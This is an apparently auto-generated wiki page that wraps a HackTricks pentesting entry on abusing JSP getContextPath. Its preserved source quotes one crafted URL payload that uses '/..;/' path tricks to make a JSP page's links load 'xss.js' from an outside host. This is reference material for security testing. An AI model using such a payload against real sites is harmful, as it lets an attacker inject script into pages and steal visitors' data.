---
parsed_by: focuslocust
source: hacktricks
type: generated
---
# JSP

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `hacktricks` |
| Type | `hacktricks-topic` |
| Record ID | `hacktricks-network-services-pentesting-pentesting-web-jsp` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/hacktricks/src/network-services-pentesting/pentesting-web/jsp.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [JSP](../../topics/network-services-pentesting/jsp.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | hacktricks-network-services-pentesting-pentesting-web-jsp |
| name | JSP |
| type | hacktricks-topic |
| source | hacktricks |
| url | https://github.com/HackTricks-wiki/hacktricks/blob/master/src/network-services-pentesting/pentesting-web/jsp.md |

## Preserved Source Material

````yaml
_body: "# JSP\n\n{{#include ../../banners/hacktricks-training.md}}\n\n## **getContextPath** abuse\n\nInfo from [here](https://blog.rakeshmane.com/2020/04/jsp-contextpath-link-manipulation-xss.html).\n\
  \n```\n http://127.0.0.1:8080/&sol;rakeshmane.com/xss.js&num;/..;/..;/contextPathExample/test.jsp\n```\n\nAccessing that\
  \ web you may change all the links to request the information to _**rakeshmane.com**_:\n\n![](<../../images/image (326).png>)\n\
  \n{{#include ../../banners/hacktricks-training.md}}"
_relative_path: network-services-pentesting/pentesting-web/jsp.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/hacktricks/src/network-services-pentesting/pentesting-web/jsp.md
````
